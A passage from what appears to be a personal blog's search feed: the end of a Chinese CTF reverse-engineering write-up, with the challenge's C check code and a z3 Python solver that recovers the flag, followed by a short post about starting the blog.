class="hljs-number">7</span>]);<br>    data_2[<span class="hljs-number">5</span>]=fun_1(flag[s9r+q1s],flag[s9r+<span class="hljs-number">5</span>],flag[s9r*<span class="hljs-number">2</span>-r8w],flag[s9r*<span class="hljs-number">2</span>+<span class="hljs-number">3</span>]);<br><br>    check_a(data_2[<span class="hljs-number">0</span>],<span class="hljs-number">0x5B</span>);<br>check_a(data_2[<span class="hljs-number">1</span>],<span class="hljs-number">13</span>);<br>check_a(data_2[<span class="hljs-number">2</span>],<span class="hljs-number">0x5D</span>);<br>    check_a(data_2[<span class="hljs-number">3</span>],<span class="hljs-number">0244</span>);<br>check_a(data_2[<span class="hljs-number">4</span>],<span class="hljs-number">52</span>);<br>check_a(data_2[<span class="hljs-number">5</span>],<span class="hljs-number">0xDC</span>);<br><br>    check_b(data_3[<span class="hljs-number">0</span>],<span class="hljs-number">0x1010</span>);<br>check_b(data_3[<span class="hljs-number">1</span>],<span class="hljs-number">024050</span>);<br>check_b(data_3[<span class="hljs-number">2</span>],<span class="hljs-number">034070</span>);<br>    check_b(data_3[<span class="hljs-number">3</span>],<span class="hljs-number">28784</span>);<br>check_b(data_3[<span class="hljs-number">4</span>],<span class="hljs-number">0x12d2d</span>);<br>check_b(data_3[<span class="hljs-number">5</span>],<span class="hljs-number">0x10d0d</span>);<br>    check_b(data_3[<span class="hljs-number">6</span>],<span class="hljs-number">042104</span>);<br>check_b(data_3[<span class="hljs-number">7</span>],<span class="hljs-number">012024</span>);<br>check_b(data_3[<span class="hljs-number">8</span>],<span class="hljs-number">0xc4c4</span>);<br>    check_b(data_3[<span class="hljs-number">9</span>],<span class="hljs-number">0156334</span>);<br>check_b(data_3[<span class="hljs-number">10</span>],<span class="hljs-number">0x16161</span>);<br>check_b(data_3[<span class="hljs-number">11</span>],<span class="hljs-number">0270561</span>);<br>    check_b(fun_2(flag[<span class="hljs-number">20</span>],flag[<span class="hljs-number">23</span>]),<span class="hljs-number">4112</span>);<br>check_b(fun_2(flag[<span class="hljs-number">14</span>],flag[<span class="hljs-number">0</span>]),<span class="hljs-number">90465</span>);<br><br>    check_c(data_1[<span class="hljs-number">3</span>],<span class="hljs-number">03417</span>);<br>check_c(data_1[<span class="hljs-number">4</span>],<span class="hljs-number">0x3787</span>);<br>check_c(data_1[<span class="hljs-number">5</span>],<span class="hljs-number">030421</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> s1d = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>s1d=(s1d*<span class="hljs-number">251</span>)^flag[i];<br><br>    <span class="hljs-built_in">printf</span>((q1s==<span class="hljs-number">7</span>)&amp;&amp;(r8w==<span class="hljs-number">15</span>)&amp;&amp;(s9r==<span class="hljs-number">13</span>)&amp;&amp;(s1d==<span class="hljs-number">0x4E6F76D0</span>)?<span class="hljs-string">&quot;:)\n&quot;</span>:<span class="hljs-string">&quot;:(\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="z3求解"><a href="#z3求解" class="headerlink" title="z3求解"></a>z3求解</h2><p>宏定义里是一些位运算，check函数和最后判断一些等式，猜测用z3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span>*<br><br>apple = <span class="hljs-number">1</span><br>banana = <span class="hljs-number">1</span><br>cherry = <span class="hljs-number">1</span><br><br>s = Solver()<br>data = [<span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000012</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000004</span>]<br><br>flag = [BitVec(<span class="hljs-string">&#x27;%d&#x27;</span> % i,<span class="hljs-number">32</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>)]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>    s.add(flag[i] &lt;<span class="hljs-number">127</span>)<br>    s.add(flag[i] &gt;=<span class="hljs-number">32</span>)<br>    <br><span class="hljs-comment"># midnight&#123;&#125;</span><br><span class="hljs-comment"># s.add(flag[0] == 0x6d)</span><br><span class="hljs-comment"># s.add(flag[1] == 0x69)</span><br><span class="hljs-comment"># s.add(flag[2] == 0x64)</span><br><span class="hljs-comment"># s.add(flag[3] == 0x6e)</span><br><span class="hljs-comment"># s.add(flag[4] == 0x69)</span><br><span class="hljs-comment"># s.add(flag[5] == 0x67)</span><br><span class="hljs-comment"># s.add(flag[6] == 0x68)</span><br><span class="hljs-comment"># s.add(flag[7] == 0x74)</span><br><span class="hljs-comment"># s.add(flag[8] == 0x7b)</span><br><span class="hljs-comment"># s.add(flag[23] == 0x7d)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_1</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> ((x &lt;&lt; <span class="hljs-number">4</span>) | (x &gt;&gt; <span class="hljs-number">4</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_2</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> ((x ^ y) &amp; <span class="hljs-number">0xff</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_3</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> ((x &amp; <span class="hljs-number">0x55</span>) | ((y &amp; <span class="hljs-number">0xaa</span>) &gt;&gt; <span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_4</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> (((x * y) % <span class="hljs-number">1257</span>) &amp; <span class="hljs-number">0xff</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_5</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> ((x &lt;&lt; <span class="hljs-number">1</span>) | (x &gt;&gt; <span class="hljs-number">7</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_6</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> ((x &lt;&lt; <span class="hljs-number">3</span>) ^ (x &gt;&gt; <span class="hljs-number">5</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_7</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">return</span> ((x &lt;&lt; <span class="hljs-number">4</span>) ^ y)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_1</span>(<span class="hljs-params">a, b, c, d</span>):<br>    <span class="hljs-keyword">return</span> calc_1(calc_4(calc_5(calc_1(calc_3(calc_5(calc_2(a,b)),calc_5(calc_2(c,d))))),b))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_2</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> calc_5(calc_1(calc_2(a,b)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_3</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> calc_7(b,calc_1(calc_2(a,b)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func_4</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> (a ^ b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_a</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">global</span> apple<br>    s.add(calc_4(calc_5(calc_1(a)),apple) == b)<br>    apple += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_b</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">global</span> banana<br>    s.add(calc_5(calc_1(a)) == b)<br>    banana += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_c</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">global</span> cherry<br>    s.add(calc_6(a) == b)<br>    cherry += <span class="hljs-number">1</span><br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    input_len = <span class="hljs-number">24</span><br>    array_1st = [<span class="hljs-number">0</span>] * <span class="hljs-number">6</span><br>    array_2nd = [<span class="hljs-number">0</span>] * <span class="hljs-number">6</span><br>    array_3rd = [<span class="hljs-number">0</span>] * <span class="hljs-number">12</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, input_len, <span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">12</span>:<br>            array_3rd[data[i + <span class="hljs-number">3</span>] // <span class="hljs-number">2</span>] = func_2(flag[data[i + <span class="hljs-number">3</span>]], flag[data[i + <span class="hljs-number">3</span>] + <span class="hljs-number">1</span>])<br>            array_1st[i // <span class="hljs-number">4</span>] = func_4(func_3(flag[i * <span class="hljs-number">2</span>], flag[i * <span class="hljs-number">2</span> + <span class="hljs-number">2</span>]), func_3(flag[i * <span class="hljs-number">2</span> + <span class="hljs-number">4</span>], flag[i * <span class="hljs-number">2</span> + <span class="hljs-number">6</span>]))<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">4</span>:<br>                array_2nd[i // <span class="hljs-number">4</span>] = func_1(flag[i], flag[i + <span class="hljs-number">4</span>], flag[i + <span class="hljs-number">8</span>], flag[i + <span class="hljs-number">12</span>])<br>            array_1st[(i // <span class="hljs-number">4</span>) + <span class="hljs-number">3</span>] = func_4(func_3(flag[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>], flag[i * <span class="hljs-number">2</span> + <span class="hljs-number">3</span>]), func_3(flag[i * <span class="hljs-number">2</span> +<span class="hljs-number">5</span>], flag[i *<span class="hljs-number">2</span>+<span class="hljs-number">7</span>]))<br>            array_3rd[data[i+<span class="hljs-number">1</span>]//<span class="hljs-number">2</span>]=func_2(flag[data[i+<span class="hljs-number">1</span>]],flag[data[i+<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>])<br>            array_3rd[data[i+<span class="hljs-number">2</span>]//<span class="hljs-number">2</span>]=func_2(flag[data[i+<span class="hljs-number">2</span>]],flag[data[i+<span class="hljs-number">2</span>]+<span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> i==<span class="hljs-number">4</span>:<br>                array_2nd[<span class="hljs-number">1</span>]=func_1(flag[<span class="hljs-number">16</span>],flag[<span class="hljs-number">20</span>],flag[<span class="hljs-number">1</span>],flag[<span class="hljs-number">5</span>])<br>            array_3rd[data[i]//<span class="hljs-number">2</span>]=func_2(flag[data[i]],flag[data[i]+<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">16</span>:<br>                array_2nd[i//<span class="hljs-number">6</span>]=func_1(flag[i-<span class="hljs-number">3</span>],flag[i+<span class="hljs-number">1</span>],flag[i+<span class="hljs-number">5</span>],flag[i*<span class="hljs-number">2</span>-<span class="hljs-number">3</span>])<br>                array_2nd[<span class="hljs-number">3</span>]=func_1(flag[<span class="hljs-number">2</span>],flag[<span class="hljs-number">6</span>],flag[<span class="hljs-number">10</span>],flag[<span class="hljs-number">14</span>])<br>            check_c(array_1st[<span class="hljs-number">0</span>],<span class="hljs-number">0x202</span>)<br>            check_c(array_1st[<span class="hljs-number">1</span>],<span class="hljs-number">0x1aa2</span>)<br>            check_c(array_1st[<span class="hljs-number">2</span>],<span class="hljs-number">0x5a5</span>)<br><br>    array_2nd[<span class="hljs-number">4</span>]=func_1(flag[cherry*<span class="hljs-number">2</span>-apple-banana],flag[cherry*<span class="hljs-number">2</span>+apple+banana],flag[apple*<span class="hljs-number">3</span>],flag[banana*<span class="hljs-number">7</span>])<br>    array_2nd[<span class="hljs-number">5</span>]=func_1(flag[cherry+apple],flag[cherry+<span class="hljs-number">5</span>],flag[cherry*<span class="hljs-number">2</span>-banana],flag[cherry*<span class="hljs-number">2</span>+<span class="hljs-number">3</span>])<br>    <br>    check_a(array_2nd[<span class="hljs-number">0</span>],<span class="hljs-number">0x5B</span>)<br>    check_a(array_2nd[<span class="hljs-number">1</span>],<span class="hljs-number">0xD</span>)<br>    check_a(array_2nd[<span class="hljs-number">2</span>],<span class="hljs-number">0x5D</span>)<br>    check_a(array_2nd[<span class="hljs-number">3</span>],<span class="hljs-number">0XA4</span>)<br>    check_a(array_2nd[<span class="hljs-number">4</span>],<span class="hljs-number">0X34</span>)<br>    check_a(array_2nd[<span class="hljs-number">5</span>],<span class="hljs-number">0xDC</span>)<br><br>    check_b(array_3rd[<span class="hljs-number">0</span>],<span class="hljs-number">0x1010</span>)<br>    check_b(array_3rd[<span class="hljs-number">1</span>],<span class="hljs-number">0x2828</span>)<br>    check_b(array_3rd[<span class="hljs-number">2</span>],<span class="hljs-number">0x3838</span>)<br>    check_b(array_3rd[<span class="hljs-number">3</span>],<span class="hljs-number">0x7070</span>)<br>    check_b(array_3rd[<span class="hljs-number">4</span>],<span class="hljs-number">0x12d2d</span>)<br>    check_b(array_3rd[<span class="hljs-number">5</span>],<span class="hljs-number">0x10d0d</span>)<br>    check_b(array_3rd[<span class="hljs-number">6</span>],<span class="hljs-number">0x4444</span>)<br>    check_b(array_3rd[<span class="hljs-number">7</span>],<span class="hljs-number">0x1414</span>)<br>    check_b(array_3rd[<span class="hljs-number">8</span>],<span class="hljs-number">0xc4c4</span>)<br>    check_b(array_3rd[<span class="hljs-number">9</span>],<span class="hljs-number">0xDCDC</span>)<br>    check_b(array_3rd[<span class="hljs-number">10</span>],<span class="hljs-number">0x16161</span>)<br>    check_b(array_3rd[<span class="hljs-number">11</span>],<span class="hljs-number">0x17171</span>)<br>    <br>    check_b(func_2(flag[<span class="hljs-number">20</span>],flag[<span class="hljs-number">23</span>]),<span class="hljs-number">0x1010</span>)<br>    check_b(func_2(flag[<span class="hljs-number">14</span>],flag[<span class="hljs-number">0</span>]),<span class="hljs-number">0x16161</span>)<br>    <br>    check_c(array_1st[<span class="hljs-number">3</span>],<span class="hljs-number">0x70F</span>)<br>    check_c(array_1st[<span class="hljs-number">4</span>],<span class="hljs-number">0x3787</span>)<br>    check_c(array_1st[<span class="hljs-number">5</span>],<span class="hljs-number">0x3111</span>)<br><br>    check = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(input_len):<br>        check = (check * <span class="hljs-number">251</span>) ^ flag[i]<br>    <br>    s.add(apple == <span class="hljs-number">7</span>)<br>    s.add(banana == <span class="hljs-number">15</span>)<br>    s.add(cherry == <span class="hljs-number">13</span>)<br>    s.add(check == <span class="hljs-number">0x4E6F76D0</span>)<br><br>    <span class="hljs-built_in">print</span>(s.check())<br><br>    <span class="hljs-keyword">if</span>(s.check() == sat):<br>        fin = s.model()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(fin[x].as_long()) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> flag]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no ans&quot;</span>)<br><span class="hljs-comment">#midnight&#123;0p3N_50rCeRy!!&#125;</span><br></code></pre></td></tr></table></figure><p>感觉文章废话有些多了）以后改正</p><p>也争取以后能多出题</p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/dog0.png" alt="dog0" style="zoom:80%;" /> ]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>About the blog</title>
    <link href="/2023/04/13/about_the_blog/"/>
    <url>/2023/04/13/about_the_blog/</url>
    
    <content type="html"><![CDATA[<h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>最近因为运动会+周末(和我没有什么关系)比较闲，所以想着搭了一个博客；<br>一方面是为了记录自己学习的内容，另一方面也是督促自己学习。<br>不过之后大概就不闲了，前期画饼太多，后期实现太难…<br>大概就是这样</p><img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/dog.jpg" alt="dog" style="zoom: 25%;" /> ]]></content>
    
    
    <categories>
      
      <category>informal essay</category>
      
    </categories>
    
    
    <tags>
      
      <tag>informal essay</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
